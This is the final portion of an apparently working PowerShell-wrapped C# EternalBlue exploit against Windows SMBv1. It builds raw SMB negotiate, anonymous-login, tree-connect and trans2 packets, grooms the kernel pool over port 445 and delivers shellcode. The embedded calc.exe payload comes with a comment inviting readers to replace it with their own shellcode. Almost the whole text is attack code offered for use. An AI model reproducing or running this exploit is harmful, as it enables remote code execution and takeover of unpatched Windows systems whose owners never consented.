            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //unicode pw length
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });        //Reserved
            pkt = Combine(pkt, new byte[] { 0xd4, 0x00, 0x00, 0x00 });        //Capabilities
            pkt = Combine(pkt, new byte[] { 0x4b, 0x00 });        //Byte count
            pkt = Combine(pkt, new byte[] { 0x00 });        //ANSI pw
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Account name
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });        //Domain name

            // Windows 2000 2195
            pkt = Combine(pkt, new byte[] { 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32 });
            pkt = Combine(pkt, new byte[] { 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00 });
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });

            // Windows 2000 5.0
            pkt = Combine(pkt, new byte[] { 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32 });
            pkt = Combine(pkt, new byte[] { 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00 });

            

            return pkt;
        }


        static byte[] tree_connect_andx_request(string target,byte[] userid)
        {
            byte[] pkt = new byte[] { 0x00 };                               // pkt += Message_Type'
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x47 });            // pkt += Length'

            pkt = Combine(pkt, new byte[] { 0xFF, 0x53, 0x4D, 0x42 });      // pkt +=server_component': .SMB
            pkt = Combine(pkt, new byte[] { 0x75 });                        // pkt +=smb_command': Tree Connect AndX
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00 });      // pkt +=nt_status'
            pkt = Combine(pkt, new byte[] { 0x18 });                        // pkt +=flags'
            pkt = Combine(pkt, new byte[] { 0x01, 0x20 });                  // pkt +=flags2'
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });                  // pkt +=process_id_high'
            pkt = Combine(pkt, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });      // pkt +=signature'
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });                  // pkt +=reserved'
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });                  // pkt +=tree_id'
            pkt = Combine(pkt, new byte[] { 0x2F, 0x4B });                  // pkt +=process_id'
            pkt = Combine(pkt, userid);                                     // pkt +=user_id'
            pkt = Combine(pkt, new byte[] { 0xC5, 0x5E });                  // pkt +=multiplex_id'

            string ipc = "\\\\" + target + "\\IPC$";
                
            pkt = Combine(pkt, new byte[] { 0x04 });                        // Word Count
            pkt = Combine(pkt, new byte[] { 0xFF });                        //AndXCommand: No further commands
            pkt = Combine(pkt, new byte[] { 0x00 });                        //Reserved
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });                  //AndXOffset
            pkt = Combine(pkt, new byte[] { 0x00, 0x00 });                  //Flags
            pkt = Combine(pkt, new byte[] { 0x01, 0x00 });                  //Password Length
            pkt = Combine(pkt, new byte[] { 0x1A, 0x00 });                  //Byte Count
            pkt = Combine(pkt, new byte[] { 0x00 });                        //Password
            pkt = Combine(pkt, Encoding.ASCII.GetBytes(ipc) );              // \,0xxx.xxx.xxx.xxx\IPC$
            pkt = Combine(pkt, new byte[] { 0x00 });                        //null byte after ipc added by kev
            pkt = Combine(pkt, new byte[] { 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 });  //Service

            int len = pkt.Length - 4;
            // netbios[1] =pkt +=0x00' + struct.pack('>H length)
            byte[] hexlen = new byte[3];
            hexlen = BitConverter.GetBytes(len);
            //hexlen = Array.Reverse(hexlen,0,hexlen.Length);

            pkt[1] = hexlen[2];
            pkt[2] = hexlen[1];
            pkt[3] = hexlen[0];
            
            

            return pkt;
        }


        static SMBHeader smb_header(byte[] smbheader)
        {
            SMBHeader parsed_headers;
            parsed_headers.server_component=smbheader.Take(4).ToArray();
            parsed_headers.smb_command = smbheader[4];
            parsed_headers.error_class = smbheader[5];
            parsed_headers.reserved1 = smbheader[6];
            parsed_headers.error_code = smbheader.Skip(6).Take(2).ToArray();
            parsed_headers.flags = smbheader[8];
            parsed_headers.flags2 = smbheader.Skip(9).Take(2).ToArray();
            parsed_headers.process_id_high = smbheader.Skip(11).Take(2).ToArray();
            parsed_headers.signature = smbheader.Skip(13).Take(9).ToArray();
            parsed_headers.reserved2 = smbheader.Skip(22).Take(2).ToArray();
            parsed_headers.tree_id = smbheader.Skip(24).Take(2).ToArray();
            parsed_headers.process_id = smbheader.Skip(26).Take(2).ToArray();
            parsed_headers.user_id = smbheader.Skip(28).Take(2).ToArray();
            parsed_headers.multiplex_id = smbheader.Skip(30).Take(2).ToArray();

            
            return parsed_headers;
        }


        static KeyValuePair<byte[],SMBHeader> smb1_get_response(Socket sock)
        {
            byte[] tcp_response = new byte[1024];
            try
            {
                sock.Receive(tcp_response);
            }
            catch
            {
                Console.Write("socket error, exploit may fail ");
            }

            byte[] netbios = tcp_response.Take(4).ToArray();
            byte[] smbheader = tcp_response.Skip(4).Take(32).ToArray();  // SMB Header: 32 bytes
            SMBHeader parsed_header = smb_header(smbheader);
            
            return new KeyValuePair<byte[],SMBHeader>(tcp_response, parsed_header);
        }


        static KeyValuePair<byte[],SMBHeader> client_negotiate(Socket sock)
        {
            byte[] raw_proto = negotiate_proto_request();
            sock.Send(raw_proto);
            return smb1_get_response(sock);
        }


        static KeyValuePair<byte[], SMBHeader> smb1_anonymous_login(Socket sock)
        {
            byte[] raw_proto = make_smb1_anonymous_login_packet();
            sock.Send( raw_proto);
            return smb1_get_response(sock);

        }

        static KeyValuePair<byte[], SMBHeader> tree_connect_andx(Socket sock,String target,byte[] userid)
        {
            byte[] raw_proto = tree_connect_andx_request( target, userid);
            sock.Send(raw_proto);
            return smb1_get_response(sock);
        }


        static KeyValuePair<SMBHeader,Socket> smb1_anonymous_connect_ipc(String target)
        {
            TcpClient client = new TcpClient(target, 445);

            Socket sock = client.Client;
            client_negotiate(sock);

            var res = smb1_anonymous_login(sock);
            byte[] raw = res.Key;
            SMBHeader smbheader = res.Value;

            var res1 = tree_connect_andx( sock, target, smbheader.user_id);
            raw = res1.Key;
            smbheader = res1.Value ;
            return new KeyValuePair<SMBHeader,Socket>(smbheader, sock);
        }


        static void smb1_large_buffer(SMBHeader smbheader,Socket sock)
        {
            byte[] nt_trans_pkt = make_smb1_nt_trans_packet(smbheader.tree_id, smbheader.user_id);

            //send NT Trans

            sock.Send(nt_trans_pkt);

            var res = smb1_get_response(sock);
            byte[] raw = res.Key;
            SMBHeader transheader = res.Value;

            //initial trans2 request
            byte[] trans2_pkt_nulled = make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_zero", 0);

            // send all but the last packet
            for (int i = 1; i <= 14; i++)
            {
                trans2_pkt_nulled = Combine( trans2_pkt_nulled , make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_buffer", i));
   
            }

            trans2_pkt_nulled = Combine(trans2_pkt_nulled, make_smb1_echo_packet(smbheader.tree_id, smbheader.user_id));
            sock.Send(trans2_pkt_nulled);

            smb1_get_response(sock);
            //no print response?
        }


        static Socket smb1_free_hole(String target,bool start)
        {
            TcpClient client = new TcpClient(target, 445);

            Socket sock = client.Client;
            client_negotiate(sock);

            byte[] pkt;
            if (start) {
                pkt = make_smb1_free_hole_session_packet(new byte[] { 0x07, 0xc0 }, new byte[] { 0x2d, 0x01 }, new byte[] { 0xf0, 0xff, 0x00, 0x00, 0x00 });
            } 
            else {
                pkt = make_smb1_free_hole_session_packet(new byte[] { 0x07, 0x40 }, new byte[] { 0x2c, 0x01 }, new byte[] { 0xf8, 0x87, 0x00, 0x00, 0x00 });
            }

            sock.Send(pkt);
            smb1_get_response(sock);

            return sock;
        }


        static List<Socket> smb2_grooms(String target, int grooms,byte[] payload_hdr_pkt,List<Socket> groom_socks)
        {
            for (int i = 0; i < grooms; i++)
            {
                TcpClient client = new TcpClient(target, 445);

                Socket gsock = client.Client;
                groom_socks.Add(gsock);
                gsock.Send(payload_hdr_pkt);

            }
            return groom_socks;
        }


        static void smb_eternalblue(String target,int grooms)
        {
            // replace null bytes with your shellcode
            // CURRENT SHELLCODE = Calc.exe
            byte[] payload = new byte[]{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xe4,0xf0, 0x50, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59,
                                    0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48,
                                    0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30,
                                    0x03, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48,
                                    0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52,
                                    0x02, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b,
                                    0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7,
                                    0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x68, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b,
                                    0x5a, 0x59, 0x58, 0xc3 };

            byte[] shellcode = make_kernel_user_payload(payload);
            byte[] payload_hdr_pkt = make_smb2_payload_headers_packet();
            byte[] payload_body_pkt = make_smb2_payload_body_packet(shellcode);


            Console.Write("Connecting to target for activities\r\n");
            var res = smb1_anonymous_connect_ipc(target);
            SMBHeader smbheader = res.Key;
            Socket sock = res.Value;

            sock.ReceiveTimeout = 2000;
            Console.Write("Connection established for exploitation.\r\n");

            // Step 2: Create a large SMB1 buffer
            Console.Write("all but last fragment of exploit packet\r\n");
            smb1_large_buffer(smbheader, sock);

            // Step 3: Groom the pool with payload packets, and open/close SMB1 packets

            // initialize_groom_threads(ip, port, payload, grooms)
            Socket fhs_sock = smb1_free_hole(target, true); 
            List<Socket> groom_socks = new List<Socket>();
            groom_socks = smb2_grooms(target, grooms, payload_hdr_pkt, groom_socks);

            Socket fhf_sock = smb1_free_hole(target, false);

            fhs_sock.Close();

            groom_socks = smb2_grooms(target, 6, payload_hdr_pkt, groom_socks);

            fhf_sock.Close();

            Console.Write("Running final exploit packet\r\n");
            
            byte[] trans2_pkt_nulled = make_smb1_trans2_exploit_packet(smbheader.tree_id, smbheader.user_id, "eb_trans2_exploit", 15);
            byte[] final_exploit_pkt = trans2_pkt_nulled;
            
            try
            {
                sock.Send(final_exploit_pkt);
                var res2 = smb1_get_response(sock);
                byte[] raw = res2.Key;
                SMBHeader exploit_smb_header = res2.Value;

                Console.Write("SMB code: " + BitConverter.ToString(exploit_smb_header.error_code) + "\r\n");
            }
            catch
            {
                Console.Write("socket error, exploit may fail horribly\r\n");
            }

            Console.Write("Send the payload with the grooms\r\n");

            foreach (Socket gsock in groom_socks)
            {
                gsock.Send(payload_body_pkt.Take(2919).ToArray());
            }
            foreach (Socket gsock in groom_socks)
            {
                gsock.Send(payload_body_pkt.Skip(2920).Take(1152).ToArray());
            }
            foreach (Socket gsock in groom_socks) 
            {
                gsock.Close();
            }

            sock.Close();
        }


        public static void run(String target, int grooms, int max_attempts)
        {
            int initial_grooms = new int();

            for (int i = 0; i < max_attempts; i++) {
                grooms = initial_grooms + GROOM_DELTA * i;
                smb_eternalblue(target, grooms);
                Console.Write("\r\n");
            }
        }
    }
}
"@ 

Add-Type -TypeDefinition $Source -Language CSharp

[Windows.Exploits.EternalBlue]::run($Target, $Grooms, $MaxAttempts)
